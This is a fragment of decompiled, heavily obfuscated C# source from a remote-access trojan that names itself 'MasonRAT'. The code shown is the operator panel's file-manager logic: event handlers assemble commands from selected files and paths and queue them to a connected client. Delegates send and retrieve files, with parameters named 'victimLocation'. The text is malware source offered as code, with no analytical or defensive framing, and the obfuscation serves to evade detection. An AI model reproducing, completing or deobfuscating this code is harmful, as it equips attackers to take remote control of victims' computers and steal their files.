        string[] strArray = new string[((-492642992 ^ 1844768113 << 1429578361) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) - ((613255911 > 268695592 ? 1317207663 : 1756276884) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) % (92439141 - 473465323 % 70528741 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 395);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[5150618 - 1601102556 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 - -((-1275306948 ^ -321120392) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 396);
        strArray[(1623581008 - (1326566352 | 1496305109) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) - ((-813738240 ^ -901169006) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) % (77641242 - (1128271627 << 1121461868) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[(-1537046764 - 811997970 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + -((1945922549 ^ 11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = selectedItem.Text;
        strArray[((1743910094 > 656263811 ? -73126 : -97501) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + (-1767810539 - 1328972897 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 >> 769099834 + 729086836 % 1778405223 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 397);
        strArray[(1052031496 - 1192836733 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0 ^ ~(1950693062 - 1809887828 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[(-1781123212 ^ 18) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - -(-1467381713 - (777500298 | 375229838) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = selectedItem.Text.Replace(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 398), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 399));
        strArray[994078385 - 458053349 % 188266014 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + ((719667255 > 253743103 ? 204629727 : 272839636) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 << (1854653739 - 101842785 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 400);
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Eؤگ\u060Dۙـڛح\u0609ـ\u060Aۚؤڇـ̍ـۡ\u060D(
    object sender,
    PaintEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cټټڙ\u060A\u0609ﻻئـ̍ـڠڙۭةبۛ\u060Aـ(
    object sender,
    CancelEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـ\u060Bـ\u060Aژﻼ\u060Aﮪڙـ(object sender, CancelEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u0608ـ\u0608ـ\u060A\u060Bٸـ\u0609ــ\u060A\u060Dـ\u060A\u0608ـ\u0609(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cּـڙۡٺ\u060Dحـــ\u060Aۡڜټ\u060Dـۏ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 401) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Fبء\u060Cـ\u060Aٽ̨ۧـڅڟـ\u060Aحـڼ\u060B\u060A\u060D(
    object sender,
    EventArgs e)
  {
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 402) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 403)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270Cـْٽـټټـڞ\u0609\u060Bـ\u0609\u060Eڕٺ\u0608(
    object sender,
    EventArgs e)
  {
    try
    {
      if (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Length < (-1064580729 - 1200081283 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + (1915626062 - 20945746 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 << (-1698570547 - 1534904285 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0)
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 404);
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 405)));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
      else
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 406)));
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, checked (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 407)) + 1));
        this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  public delegate void SendFileEventHandler(string ip, string victimLocation, string filepath);

  public delegate void RetrieveFileEventHandler(
    string ip,
    string victimLocation,
    string filepath,
    string filesize);
}
